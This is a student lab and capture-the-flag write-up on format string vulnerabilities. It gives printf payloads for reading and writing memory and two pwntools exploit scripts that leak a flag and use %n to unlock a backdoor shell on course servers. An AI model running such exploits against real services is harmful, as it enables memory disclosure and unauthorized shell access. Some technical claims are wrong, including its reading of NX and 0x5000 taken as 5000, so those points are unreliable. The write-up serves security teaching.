# Format Strings

## Task 1
Since printf is compiled in run time and we decide the arguments for the printf on format.c through the stdin, we can make the program crash. If we insert on the stdin a normal string or "%d", "%x" or "%c" the program will behave normally and finish with no errors. But if we insert "%s" or "%n" on the stdin, the printf call will search on the top of the stack for a pointer (in the case of the "%s" will search for the pointer that points to the beggining of the string) and will treat whatever that is there as an adress, which will crash the program.

## Task 2

### Task 2.A
We provide the following input:

`@@@@.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x`

Here, we enter our data @@@@ and a series of %.8x data. Then we look for our value @@@@, whose ASCII value is 40404040 as stored in the memory. We see that at the 24th %x, we see our input and hence we were successful in reading our data that is stored on the stack. The rest of the
%x is also displaying the content of the stack. We require 24 format specifiers to print out the first 4 bytes of our input.


### Task 2.B
We provide the following input to the server:

`$ echo$(printf "\xc0\x87\x04\x08")%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x > input`

`nc -u 127.0.0.1 9090 < input `

After using these inputs we can see that the output shows that the secret message stored in the heap area is printed out.
We successfully read the heap data by storing the address of the heap data in the stack and then using the %s format specifier at the right location so that it reads the stored memory address and then get the value from that address.


## Task 3

### Task 3.A
In this task we need to change number variable.


Like we have done in task 2B, we have to access the address by making it the beginning of our string into it. The address is 0x080e5068.


We can access it by using "%x" 64 times and changing the values for 63 times plus "%n".The reason for this is the same we used to crash the server and we can write to the address the pointer is pointing to.In this case pointing to where the secret variable was located.


### Task 3.B
The difference between task 3B and 3A is in this one we have to change the secret variable like task 3A but also change it to a specific value: 0x5000

We know "%n" print the number of characters printed in the string so far, and it will be able to write 0x5000. We must make it so that our string has 5000 characters before it.


From this task we understand how printf() is used to acess or change memory from an attacked device, how it can be exploited and what cautions we need to have when using it.

We have also learned how an attacker can use the side effects of "%x", "%s", "%n" in a formatted string to his/her advantage performing an attack.

### Challange 1

#### checksec

```
[11/24/21]seed@VM:~/CTF/6$ checksec --file=program --extended
  RELRO : Partial RELRO
  STACK CANARY: Canary found
  NX: NX enabled
  PIE: No PIE
  Clang CFI: No Clang CFI found
  SafeStack: No SafeStack found
  RPATH: No RPATH
  RUNPATH	: No RUNPATH
  Symbols: 81 Symbols
  FORTIFY: Yes
  Fortified: 0
  Fortifiable:  2
  FILE: program
```

We can conclude that:

- There is a _canary_ preventing the change of the return address of functions
  (or at least making it harder)
- The _stack_ has execution permission (NX) - We can execute code that we inject
  (e.g.: shellcode)
- The position on the binary aren't randomized (PIE) - we can get the addresses
  of variables/registers using a debugger.
- There isn't a seperated stack (SafeStack) - _return addresses_ aren't
  protected.

#### What is the line of code where the vulnerability is found?

```c
scanf("%32s", &buffer);
(...)
printf(buffer); // Vulnerability
```

#### What does the vulnerability allow you to do?

The vulnerability allows us to read and write to variables/registers that we
aren't supposed to, thus allowing us the read the **flag** global variable.

#### What is the functionality that allows you to get the flag?

By using '%s' on `printf`'s format string, we can read the contents of the flag
char array. To do this, we just need to obtain the address of said variable.

#### Flag's memory address

[11/15/22]seed@VM:~/Semana7-Desafio1 gdb program
Reading symbols from program...
(...)
gdb-peda$ b load_flag
Breakpoint 1 at 0x8049256: file main.c, line 8.
gdb-peda$ run
(...)
Breakpoint 1, load_flag () at main.c:8
8	void load_flag(){
gdb-peda$ p &flag
$1 = (char (*)[40]) 0x804c060 <flag>
```

The address of the flag is `0x804c060`

#### Exploit

```py
#!/usr/bin/env python3
from pwn import *

LOCAL = False

if LOCAL:
    local = './program'
    p = process(local)
else:
    url = 'ctf-fsi.fe.up.pt'
    port = 4004
    p = remote(url, port)

p.recvuntil(b":")

content = bytearray(0x00 for i in range(32))
val = 0x0804c060
content[0:4] = (val).to_bytes(4, byteorder='little')
content[4:6] = ("%s").encode('latin-1')

p.sendline(content)
p.interactive()
p.recvuntil(b"got:")
p.sendline(b"hi")
p.interactive()
```

In this simple exploit, we store the address in the beginning of the array, and
then use '%s' to read from that memory position. We only need 1 '%s', because
`printf`'s pointer starts right on top of the buffer.


### Challange 2

#### checksec

```
[11/24/21]seed@VM:~/CTF/6$ checksec --file=program --extended
  RELRO : Partial RELRO
  STACK CANARY: Canary found
  NX: NX enabled
  PIE: No PIE
  Clang CFI: No Clang CFI found
  SafeStack: No SafeStack found
  RPATH: No RPATH
  RUNPATH	: No RUNPATH
  Symbols: 79 Symbols
  FORTIFY: Yes
  Fortified: 0
  Fortifiable:  1
  FILE: program
```

#### What is the line of code where the vulnerability is found?

```c
scanf("%32s", &buffer);
(...)
printf(buffer); // Vulnerability
```

#### What does the vulnerability allow you to do?

The vulnerability allows us to change the contents of the `key` variable in
order to access the restricted area of the code.

#### Is the flag loaded into memory? Or is there any functionality that we can use to access it?

The flag is not loaded to memory, but it is present in a file on the target
machine. The functionality that we can exploit to gain access to said file is
obtaining the correct key, activating the backdoor on the server. This spawns a
shell that we can use to read the file contents.

#### To unlock this feature what do you have to do?
To unlock this functionality, we abused the `%n` on `printf`. Our input is
passed as the format string of `printf` without any sanitation. We start by
using `gdb` to obtain the address of the `key` global variable. If we write the
correct number of chars using `printf` (0xbeef), calling `%n` on the key's
correct address will write 0xbeef to it, unlocking the backdoor.

Our buffer isn't big enough to write the needed quantity of chars, so we make
use of number padding to print more characters. This makes it so we can't have
the address of `key` at the beginning of the variable because calling `%`
commands advances `printf`'s pointer forward. We write enough to have printed
0xbeef chars, and then advance the pointer forward to the first available
position that is multiple of 4.

#### Exploit

```py
#!/usr/bin/env python3
from pwn import *

LOCAL = False

if LOCAL:
    local = './program'
    p = process(local)
else:
    url = '10.227.243.188'
    port = 4005
    p = remote(url, port)

p.recvuntil(b"...")

content = bytearray(0x00 for i in range(32))
password = 0xbeef

# the -24 is explained below
pad_str = "%0" + str(password - 24) + "x"
content[0:len(pad_str)] = (pad_str).encode('latin-1')

x_str = "%x"
x_len = len(x_str)
n = 3
for i in range(len(pad_str), len(pad_str) + x_len * n, x_len):
    content[i:i+x_len] = (x_str).encode('latin-1')

content[14:16] = ("%n").encode('latin-1')
val = 0x0804c034
content[16:20] = (val).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
  f.write(content)

p.sendline(content)
p.recvuntil(b"You gave")
p.interactive()
```

We subtract 24 from the **password** because the '%x's used print some
characters:

- first '%x' - 38343025 - this one is the one that is left-padded with zeros.
- second '%x' - 78393738
- third '%x' - 78257825
- fourth '%x' - 78256e2578254

If we sum the length of the results of the last 3 '%x', we get 24. These numbers
come from the format string we constructed.
